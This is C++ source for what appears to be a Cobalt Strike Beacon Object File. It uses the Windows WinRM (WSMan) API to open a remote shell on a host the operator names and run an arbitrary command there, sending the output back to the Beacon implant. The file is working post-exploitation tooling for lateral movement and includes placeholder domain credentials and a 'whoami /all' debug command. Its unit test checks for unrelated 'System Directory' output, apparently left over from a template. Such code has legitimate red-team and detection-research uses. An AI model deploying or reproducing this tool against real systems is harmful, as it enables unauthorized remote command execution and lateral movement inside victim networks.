#include <Windows.h>
#define WSMAN_API_VERSION_1_0
#include <wsman.h>
#include "base\helpers.h"


#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"

#ifndef _DEBUG
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
#define GetLastError KERNEL32$GetLastError 
WINBASEAPI INT WINAPI MSVCRT$vsnprintf(PCHAR d, size_t n, PCHAR format, va_list arg);
#define vsnprintf MSVCRT$vsnprintf
WINBASEAPI DWORD WINAPI WsmSvc$WSManInitialize(DWORD flags, WSMAN_API_HANDLE *apiHandle);
#define WSManInitialize WsmSvc$WSManInitialize
WINBASEAPI DWORD WINAPI WsmSvc$WSManCreateSession(WSMAN_API_HANDLE apiHandle, PCWSTR connection, DWORD flags, WSMAN_AUTHENTICATION_CREDENTIALS* serverAuthenticationCredentials, WSMAN_PROXY_INFO* proxyInfo, WSMAN_SESSION_HANDLE* session);
#define WSManCreateSession WsmSvc$WSManCreateSession
WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
#define CreateEventW KERNEL32$CreateEventW
WINBASEAPI VOID WINAPI  WsmSvc$WSManCreateShell(WSMAN_SESSION_HANDLE session, DWORD flags, PCWSTR resourceUri, WSMAN_SHELL_STARTUP_INFO* startupInfo, WSMAN_OPTION_SET* options, WSMAN_DATA* createXml, WSMAN_SHELL_ASYNC* async, WSMAN_SHELL_HANDLE* shell);
#define WSManCreateShell WsmSvc$WSManCreateShell
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD  dwMilliseconds);
#define WaitForSingleObject KERNEL32$WaitForSingleObject
WINBASEAPI BOOL WINAPI KERNEL32$SetEvent(HANDLE hEvent);
#define SetEvent KERNEL32$SetEvent
WINBASEAPI VOID WINAPI WsmSvc$WSManRunShellCommand(WSMAN_SHELL_HANDLE shell, DWORD flags, PCWSTR commandLine, WSMAN_COMMAND_ARG_SET* args, WSMAN_OPTION_SET* options, WSMAN_SHELL_ASYNC* async, WSMAN_COMMAND_HANDLE* command);
#define WSManRunShellCommand WsmSvc$WSManRunShellCommand
WINBASEAPI PVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
#define HeapAlloc KERNEL32$HeapAlloc
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
#define GetProcessHeap KERNEL32$GetProcessHeap
WINBASEAPI BOOL WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
#define CreatePipe KERNEL32$CreatePipe
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
#define WriteFile KERNEL32$WriteFile
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
#define ReadFile KERNEL32$ReadFile
WINBASEAPI PWCHAR WINAPI MSVCRT$wcscmp(const wchar_t* _lhs, const wchar_t* _rhs);
#define wcscmp MSVCRT$wcscmp
WINBASEAPI VOID WINAPI WsmSvc$WSManReceiveShellOutput(WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, DWORD flags, WSMAN_STREAM_ID_SET* desiredStreamSet, WSMAN_SHELL_ASYNC* async, WSMAN_OPERATION_HANDLE* receiveOperation);
#define WSManReceiveShellOutput WsmSvc$WSManReceiveShellOutput
WINBASEAPI VOID WINAPI WsmSvc$WSManCloseCommand(WSMAN_COMMAND_HANDLE commandHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
#define WSManCloseCommand WsmSvc$WSManCloseCommand
WINBASEAPI VOID WINAPI WsmSvc$WSManCloseShell(WSMAN_SHELL_HANDLE shellHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
#define WSManCloseShell WsmSvc$WSManCloseShell
WINBASEAPI DWORD WINAPI WsmSvc$WSManCloseSession(WSMAN_SESSION_HANDLE session, DWORD flags);
#define WSManCloseSession WsmSvc$WSManCloseSession
WINBASEAPI DWORD WINAPI WsmSvc$WSManDeinitialize(WSMAN_API_HANDLE apiHandle, DWORD flags);
#define WSManDeinitialize WsmSvc$WSManDeinitialize
WINBASEAPI DWORD WINAPI KERNEL32$CloseHandle(HANDLE hObject);
#define CloseHandle KERNEL32$CloseHandle
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
#define HeapFree KERNEL32$HeapFree
WINBASEAPI DWORD WINAPI WsmSvc$WSManCloseOperation(WSMAN_OPERATION_HANDLE operationHandle, DWORD flags);
#define WSManCloseOperation WsmSvc$WSManCloseOperation
#endif

#define DEBUG(...) debugOut(__VA_ARGS__)

VOID debugOut(const PCHAR format, ...) {
    #ifdef _DEBUG
    CHAR dbg_out[MAX_PATH];
    va_list args;
    va_start(args, format);
    vsnprintf(dbg_out, MAX_PATH, format, args);
    DEBUG(dbg_out);
    OutputDebugStringA(dbg_out);
    va_end(args);
    #endif
}

    typedef struct  {
        HANDLE event;
        BOOL hadError;
    } ctxCallback, *PCtxCallback;

    void WSManShellCompletionFunction(
        __in_opt PVOID operationContext,
        DWORD flags,
        __in WSMAN_ERROR* error,
        __in WSMAN_SHELL_HANDLE shell,
        __in_opt WSMAN_COMMAND_HANDLE command,
        __in_opt WSMAN_OPERATION_HANDLE operationHandle,
        __in_opt WSMAN_RECEIVE_DATA_RESULT* data
    ) {
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManShellCompletionFunction");
            return;
        }
        if (error && 0 != error->code)
        {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCreateShell: %ld, detail: %ls\n", error->code, error->errorDetail);
            ctxOperation->hadError = TRUE;
        }
        SetEvent(ctxOperation->event);
    }

    void ReceiveCallback(
        __in_opt PVOID operationContext,
        DWORD flags,
        __in WSMAN_ERROR* error,
        __in WSMAN_SHELL_HANDLE shell,
        __in_opt WSMAN_COMMAND_HANDLE command,
        __in_opt WSMAN_OPERATION_HANDLE operationHandle,
        __in_opt WSMAN_RECEIVE_DATA_RESULT* data
    )
    {
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManRunShellCommand");
            return;
        }
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (error && 0 != error->code)
        {
            BeaconPrintf(CALLBACK_ERROR, "error WSManRunShellCommand: %ld, detail: %ls\n", error->code, error->errorDetail);
            ctxOperation->hadError = TRUE;
        }

        // Output the received data to the console
        if (data && data->streamData.type & WSMAN_DATA_TYPE_BINARY && data->streamData.binaryData.dataLength)
        {
            DWORD bufferLength = data->streamData.binaryData.dataLength;
            PCHAR buffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
            if (buffer == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "error HeapAlloc: %d\n", GetLastError());
                return;
            }

            HANDLE hPipeRead = { 0 };
            HANDLE hPipeWrite = { 0 };
            BOOL ret;
            ret = CreatePipe(&hPipeRead, &hPipeWrite, NULL, bufferLength);
            if (ret == ERROR) {
                BeaconPrintf(CALLBACK_ERROR, "error CreatePipe: %d\n", GetLastError());
                goto cleanCallback;
            }

            DWORD t_BufferWriteLength = 0;
            ret = WriteFile(hPipeWrite,
                data->streamData.binaryData.data,
                bufferLength,
                &t_BufferWriteLength,
                NULL);
            if (ret == ERROR) {
                BeaconPrintf(CALLBACK_ERROR, "error WriteFile: %d\n", GetLastError());
                goto cleanCallback;
            }

            DWORD bytesRead = 0;
            ret = ReadFile(hPipeRead, buffer, bufferLength, &bytesRead, FALSE);
            if (ret == ERROR) {
                BeaconPrintf(CALLBACK_ERROR, "error ReadFile: %d\n", GetLastError());
                goto cleanCallback;
            }
            BeaconPrintf(CALLBACK_OUTPUT, buffer);

        cleanCallback:
            if (!HeapFree(GetProcessHeap(), NULL, buffer)) {
                BeaconPrintf(CALLBACK_ERROR, "error HeapFree: %d\n", GetLastError());
            }
            if (hPipeRead != NULL) CloseHandle(hPipeRead);
            if (hPipeWrite != NULL) CloseHandle(hPipeWrite);
        }

        // for WSManReceiveShellOutput, needs to wait for state to be done before signaliing the end of the operation
        if ((error && 0 != error->code) || (data && data->commandState && wcscmp(data->commandState, WSMAN_COMMAND_STATE_DONE) == 0))
        {
            SetEvent(ctxOperation->event);
        }
    }


    void go(char* args, int length) {
#ifndef _DEBUG
        datap  parser;
        BeaconDataParse(&parser, args, length);
        PWCHAR hostname = (PWCHAR)BeaconDataExtract(&parser, NULL);
        PWCHAR cmd = (PWCHAR)BeaconDataExtract(&parser, NULL);
#else
        PWCHAR hostname = L"adcs";
        PWCHAR cmd = L"whoami /all";
#endif

        HANDLE hEventShellCompl = { 0 };
        HANDLE hEventReceive = { 0 };
        WSMAN_API_HANDLE hApi = { 0 };
        WSMAN_SHELL_HANDLE hShell = { 0 };
        WSMAN_SHELL_ASYNC wsAsync = { 0 };
        WSMAN_SHELL_ASYNC wsAsyncShell = { 0 };
        WSMAN_COMMAND_HANDLE hCmd = { 0 };
        WSMAN_OPERATION_HANDLE receiveOperation = { 0 };
        ctxCallback ctxCreateShell = { 0 };
        ctxCallback ctxReceiveShell = { 0 };
        WSMAN_AUTHENTICATION_CREDENTIALS serverAuthenticationCredentials = { 0 };

        DWORD ret;
        ret = WSManInitialize(WSMAN_FLAG_REQUESTED_API_VERSION_1_0, &hApi);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "Error WSManInitialize: %ld\n", ret);
            goto deInitialize;
        }
        DEBUG("success WSManInitialize\n");

        serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_DEFAULT_AUTHENTICATION;
#ifdef _DEBUG
        serverAuthenticationCredentials.userAccount.username = L"domain\\user";
        serverAuthenticationCredentials.userAccount.password = L"password";
#endif

        PCWSTR connection = hostname;
        WSMAN_SESSION_HANDLE hSession = { 0 };
        ret = WSManCreateSession(hApi, connection, 0, &serverAuthenticationCredentials, NULL, &hSession);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCreateSesdsion: %ld\n", ret);
            goto closeSession;
        }
        DEBUG("success WSManCreateSession\n");

        hEventShellCompl = CreateEventW(NULL, FALSE, NULL, NULL);
        if (hEventShellCompl == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %ld\n", GetLastError());
            goto closeSession;
        }
        ctxCreateShell.event = hEventShellCompl;
        wsAsync.operationContext = &ctxCreateShell;
        wsAsync.completionFunction = &WSManShellCompletionFunction;

        WSManCreateShell(hSession, 0, WSMAN_CMDSHELL_URI, NULL, NULL, NULL, &wsAsync, &hShell);
        WaitForSingleObject(hEventShellCompl, INFINITE);
        if (ctxCreateShell.hadError) {
            BeaconPrintf(CALLBACK_ERROR, "error in WSManCreateShell callback\n");
            goto closeShell;
        }
        DEBUG("success WSManCreateShell\n");

        PCWSTR commandLine = cmd;
        WSManRunShellCommand(hShell, 0, commandLine, NULL, NULL, &wsAsync, &hCmd);
        WaitForSingleObject(hEventShellCompl, INFINITE);
        if (ctxCreateShell.hadError) {
            BeaconPrintf(CALLBACK_ERROR, "error in WSManRunShellCommand callback\n");
            goto closeCommand;
        }
        DEBUG("success WSManRunShellCommand\n");

        hEventReceive = CreateEventW(NULL, FALSE, NULL, NULL);
        if (hEventReceive == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %d\n", GetLastError());
            goto closeCommand;
        }
        ctxReceiveShell.event = hEventReceive;
        wsAsyncShell.operationContext = &ctxReceiveShell;
        wsAsyncShell.completionFunction = &ReceiveCallback;

        WSManReceiveShellOutput(hShell, hCmd, 0, NULL, &wsAsyncShell, &receiveOperation);
        WaitForSingleObject(hEventReceive, INFINITE);
        if (ctxReceiveShell.hadError) {
            BeaconPrintf(CALLBACK_ERROR, "error in WSManReceiveShellOutput callback\n");
            goto closeOperation;
        }
        DEBUG("success WSManReceiveShellOutput\n");

        closeOperation:
        ret = WSManCloseOperation(receiveOperation, 0);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCloseOperation: %ld\n", ret);
        }
        DEBUG("success WSManCloseOperation\n");

        closeCommand:
        WSManCloseCommand(hCmd, 0, &wsAsync);
        WaitForSingleObject(hEventShellCompl, INFINITE);
        DEBUG("success WSManCloseCommand\n");

        closeShell:
        WSManCloseShell(hShell, 0, &wsAsync);
        WaitForSingleObject(hEventShellCompl, INFINITE);
        DEBUG("success WSManCloseShell\n");

        closeSession:
        ret = WSManCloseSession(hSession, 0);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCloseSession: %ld\n", ret);
        }
        DEBUG("success WSManCloseSession\n");

        deInitialize:
        ret = WSManDeinitialize(hApi, 0);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManDeinitialize: %ld\n", ret);
        }
        DEBUG("success WSManDeinitialize\n");

        if (hEventReceive != NULL) CloseHandle(hEventReceive);
        if (hEventShellCompl != NULL) CloseHandle(hEventShellCompl);

    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif